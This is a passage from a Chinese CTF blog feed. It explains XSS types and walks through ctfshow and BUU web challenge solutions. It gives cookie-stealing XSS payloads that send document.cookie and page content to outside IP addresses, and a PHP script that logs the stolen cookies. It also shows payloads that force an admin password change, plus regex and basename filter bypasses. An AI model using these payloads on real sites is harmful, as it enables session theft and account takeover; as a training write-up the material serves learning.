    <url>/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
<li>诱使受害者打开受到攻击的服务器URL。</li>
<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
</ul>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p><strong>反射型XSS：</strong>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
<p><strong>存储型XSS：</strong>&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
<p><strong>DOM型XSS：</strong>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a><a class="link" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM型XSS： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="场景一：innerHTML"><a href="#场景一：innerHTML" class="headerlink" title="场景一：innerHTML"></a>场景一：innerHTML</h4><h4 id="场景二：跳转"><a href="#场景二：跳转" class="headerlink" title="场景二：跳转"></a>场景二：跳转</h4><h4 id="场景三：eval"><a href="#场景三：eval" class="headerlink" title="场景三：eval"></a>场景三：eval</h4><h4 id="场景四：cookie、referer"><a href="#场景四：cookie、referer" class="headerlink" title="场景四：cookie、referer"></a>场景四：cookie、referer</h4><h4 id="场景五：document-write、document-URL-indexOf-“id-”"><a href="#场景五：document-write、document-URL-indexOf-“id-”" class="headerlink" title="场景五：document.write、document.URL.indexOf(“id&#x3D;”)"></a>场景五：document.write、document.URL.indexOf(“id&#x3D;”)</h4><p><strong>解释一些常用js代码的意思:</strong></p>
<p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
<p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
<p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
<p><code>onerror</code>：当事件失败时会触发，<strong>配合img标签使用，不给图片地址（加载失败）&#x3D;&gt;触发onerror</strong></p>
<p><strong>Linux服务器关闭端口的一些常用指令：</strong></p>
<p><code>netstat -tuln</code></p>
<blockquote>
<p>-&gt; -t 是显示TCP协议的连接</p>
<p>-&gt; -u 是显示UDP协议的连接</p>
<p>-&gt; -l 是仅显示监听状态的连接</p>
<p>-&gt; -n 是以数字形式显示端口号和IP地址</p>
</blockquote>
<p><strong>Xss测试过滤：</strong></p>
<script>alert(1)</script>

<p>&lt;img alert(1)&gt;</p>
<body>alert(1)(</body>

<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a class="link" href="https://www.freebuf.com/articles/web/340080.html">Xss payload <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><h4 id="1-无过滤"><a href="#1-无过滤" class="headerlink" title="1.无过滤"></a>1.无过滤</h4><p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2-过滤script"><a href="#2-过滤script" class="headerlink" title="2.过滤script"></a>2.过滤script</h4><blockquote>
<p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<p><code>&lt;img src=&#39;&#39; onerror=location.href=&#39;http://39.103.98.109/127.php?cookie=&#39;+document.cookie&gt;</code></p>
<p><code>&lt;svg/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
<p><code>&lt;input/**/οnfοcus=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
<p><code>&lt;iframe/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</code></p>
</blockquote>
<h4 id="3-存储型Xss-payload："><a href="#3-存储型Xss-payload：" class="headerlink" title="3.存储型Xss payload："></a>3.存储型Xss payload：</h4><p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<h2 id="以ctfshow-xss-web328为例："><a href="#以ctfshow-xss-web328为例：" class="headerlink" title="以ctfshow xss web328为例："></a>以ctfshow xss web328为例：</h2><p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.cookie)&lt;/script&gt;</code></p>
<p>题目：用户管理页面有信息（需要是admin用户    才可以看到flag）</p>
<p>思路：伪造SESSION admin用户</p>
<p><strong>1. 获取admin的SESSION：监听端口，用户注册，收到的信息里面的SESSION应该是admin的</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-00.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-01.png"></p>
<p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-02.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-03.png"></p>
<h3 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h3><h4 id="法一：外带信息payload：（监听端口）"><a href="#法一：外带信息payload：（监听端口）" class="headerlink" title="法一：外带信息payload：（监听端口）"></a>法一：外带信息payload：（监听端口）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure></div>

<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
<p>-&gt; <code>window.open</code> 打开新链接</p>
<p>-&gt; <code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;) </code>是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
<p>-&gt; <code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）</p>
<h4 id="法二：jQuery-选择器查找类和获取内容。"><a href="#法二：jQuery-选择器查找类和获取内容。" class="headerlink" title="法二：jQuery 选择器查找类和获取内容。"></a>法二：jQuery 选择器查找类和获取内容。</h4><p>jQuery选择器：用于选择HTML元素的强大工具，使得开发者能更好的获取页面中的元素.</p>
<p><code>&lt;script&gt;$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if ((value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#39;script&#39;) === -1)) &#123;window.location.href = &#39;http://39.103.98.109:10086/&#39; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
<blockquote>
<p><code>$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index, value) &#123; ... &#125;);</code></p>
<p>这是一个 jQuery 选择器，它查找具有类名 <code>&#39;layui-table-cell&#39;</code>、<code>&#39;laytable-cell-1-0-1&#39;</code> 的 <code>&lt;div&gt;</code> 元素集合，并对每个元素执行一个函数</p>
</blockquote>
<blockquote>
<p><code>.each(function(index, value) &#123; ... &#125;)</code></p>
<p>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，<code>index</code> 表示当前元素在集合中的索引，<code>value</code> 表示当前元素的引用。</p>
</blockquote>
<blockquote>
<p><code>if (value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1) &#123; ... &#125;</code><br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 <code>&#39;ctfshow&#123;&#39;</code>。<code>value.innerHTML</code> 表示当前元素的 HTML 内容，<code>.indexOf(&#39;ctfshow&#123;&#39;)</code> 用于查找是否包含 <code>&#39;ctfshow&#123;&#39;</code>，如果包含则返回大于 -1 的索引，否则返回 -1</p>
</blockquote>
<blockquote>
<p><code>window.location.href = &#39;http://120.46.41.173:9023/&#39; + value.innerHTML;</code><br> 如果条件满足，即当前元素的内容包含 <code>&#39;ctfshow&#123;&#39;</code>，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 <code>&#39;http://120.46.41.173:9023/&#39;</code> 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 <code>&#39;ctfshow&#123;&#39;</code> 以及其他内容。</p>
</blockquote>
<p><strong>法三：querySelector方法获取内容</strong></p>
<p>querySelector：DOM（文档对象模型）选择器，通过CSS选择器从文档中获取一个匹配的元素，返回的是文档中匹配指定的CSS选择器中的第一个元素。    querySelectorAll返回匹配的全部元素</p>
<p><strong>基本语法：</strong></p>
<ul>
<li><code>var element = document.querySelector(selector);</code></li>
</ul>
<p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
<h2 id="web329-payload"><a href="#web329-payload" class="headerlink" title="web329 payload:"></a>web329 payload:</h2><p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
<blockquote>
<p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
</blockquote>
<blockquote>
<p>img.src &#x3D; “<a class="link" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
<p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
</blockquote>
<blockquote>
<p>document.body.append(img) 这段代码将创建的图像元素img添加到页面的body元素内，这样图像就会被加载并显示在页面上.</p>
</blockquote>
<h2 id="web330-payload："><a href="#web330-payload：" class="headerlink" title="web330 payload："></a>web330 payload：</h2><p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=1717&#39;;&lt;/script&gt;</code></p>
<p>思路：这个题可以修改密码，让admin管理员自己修改密码.</p>
<p>自己先注册号，在修改密码页面抓包，看是什么情况</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/330.01.png"></p>
<p>很明显，有了路径，且变量p就是我们修改密码的变量</p>
<p>直接创建账号密码 都为 payload，让admin在点击我们的payload的时候，会自动修改密码为1717</p>
<p>这个时候我们直接以admin账号 密码为1717登录即可，</p>
<p>-&gt; 然后点击用户管理（这个时候也相当于点击我们的payload的，会发生页面跳转）</p>
<p>-&gt; 我们可以点击用户管理的同时打开源码或者抓包。</p>
<h2 id="web-331-payload："><a href="#web-331-payload：" class="headerlink" title="web 331 payload："></a>web 331 payload：</h2><p>这个题变成了post方法，改一改payload即可，其他与上一题一样：</p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;&#125;)&lt;/script&gt;</code></p>
<p>-&gt; 这段代码是用<code>jQuery</code>库中的 <code>$.ajax()</code> 函数发起的一个异步http请求。</p>
<p>-&gt; <code>$.ajax(&#123;&#125;)</code> 这是<code>jQuery</code>库提供的用于异步http请求的方法。它接受一个包含配置选项的对象作为参数</p>
<p>-&gt;<code>url:&quot;api/change.php&quot;</code> 这是请求的目标URL，请求被发送到目标URL，向服务器发送一个HTTP请求</p>
<p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
<p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
<hr>
<p><a class="link" href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>漏洞学习</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU平台的Web题记录</title>
    <url>/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ul>
<li>basenmae()函数的问题</li>
<li>正则匹配的绕过</li>
<li>代码审计</li>
<li>PHP预定义的超全局变量</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code></p>
<p> -&gt; 获取当前正在执行的脚本的路径中的名字</p>
<p><code>preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></p>
<p>-&gt; 正则匹配中 <code>./</code>有特殊含义，用<code>\</code> 来转义   </p>
<p>&#x3D;&gt; 如果当前目录的最后的脚本的名字是以 <code>config.php/</code>就会匹配成功 返回True</p>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>源码中给出了 Flag在config.php，所以我们绕过这个正在匹配，来高亮显示config.php文件 读取flag</p>
<p>这个源码中下半部分是 </p>
<p>-&gt; 64位二进制随机数转换成十六进制 后与 POST方法传入的参数  hash值比较</p>
<p>-&gt; 不知道从这个角度能否下手。</p>
<p><strong>还是绕过正则：</strong></p>
<p>这里 <code>basename()</code>函数存在一个问题 &#x3D;&gt; 它会去掉文件名开头中的非ASCII码值</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">basename</span>(<span class="string">&quot;%feconfig.php&quot;</span>)); <span class="comment">// 随便非ASCII码值就可以</span></span><br></pre></td></tr></table></figure></div>

<p>payload:<code>/index.php/config.php/%fe?source</code></p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>初始是50元，先购买前面的 看看有什么信息（根据题目Cookie），通过抓包，发现Cookie是经过base64加密的 且是有一定的格式的。</p>
<p>我是通过抓包修改Cookie，让剩余的钱数变成大于100后放包，直接买flag的商品</p>
<p><code>&#123;&quot;money&quot;: 150, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code></p>
<p>-&gt;这是Cookie的格式，钱数就是 买完之后还有多少钱</p>
<p>-&gt; history指的是 你的购买记录</p>
<p>&#x3D;&gt; 抓包修改 money 放包</p>
<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
<ul>
<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
</blockquote>
<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
<p>payload1：<code>/?b u p t=23333%0A</code></p>
<p><strong>访问下一个页面：</strong></p>
<ul>
<li><input disabled type="checkbox"> 编码的特征认识</li>
</ul>
<p>源码中存在JSfuck编码，<a class="link" href="http://www.hiencode.com/jsfuck.html">解码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&#x3D;&gt; alert(“post me Merak” </p>
<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
<blockquote>
<p>alert()是js中的弹出函数</p>
</blockquote>
<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/%E5%A5%97%E5%A8%8300.png" alt="./"></p>
<p><strong>回显出第三个页面：</strong></p>
<ul>
<li><input disabled type="checkbox"> 代码审计</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure></div>

<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure></div>

<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/%E5%A5%97%E5%A8%8301.png"></p>
<h2 id="0CTF-2016-piapiapia记录"><a href="#0CTF-2016-piapiapia记录" class="headerlink" title="[0CTF 2016]piapiapia记录"></a>[0CTF 2016]piapiapia记录</h2><p>打开题目网址，登录页面，像是sql注入，但是没测试到注入，用sqlmap也没跑出来（post）。扫后面，我自己没扫到，看Wp说是有<a class="link" href="http://www.zip文件/">www.zip文件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>-&gt; 访问并下载源码文件 -&gt; 用审计工具进行审计</p>
<p>-&gt; 首先是有一个 register.php文件 &#x3D;&gt; 注册页面，那自己随便注册一下 登录之后 跳转到了update.php 即 文件上传页面</p>
<p>-&gt; 经过测试，好像并没有文件上传漏洞</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia00.png"></p>
<p>进行代码审计：config.php文件中有<code>$flag</code>   那我们的目标的应该是读取config.php文件（<strong>文件读取漏洞</strong>）</p>
<p><strong>profile.php文件中存在：</strong></p>
<p>1.<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> 很明显的文件读取函数</p>
<p>2.<code>$profile = unserialize($profile);</code>这里还有一个反序列化函数</p>
<p><strong>update.php文件中存在：</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia01.png"></p>
<p>而update.php文件是我们上传文件的页面，$profile中的一些参数刚好对应上传文件页面的东西，最后还会进行序列化这个$profile</p>
<p>最后调用了 update_profile函数</p>
<p><strong>class.php文件中存在：</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia02.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia03.png"></p>
<p>我们在update.php文件内传参，然后可以跳转到profile.php文件内</p>
<p>在update.php内：class.php中user类的<code>update_profile($username, serialize($profile))</code> -&gt; 多次过滤，&#x3D;&gt; 调用父类mysql类的<code>parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</code>  -&gt; 更新数据库中的数据 </p>
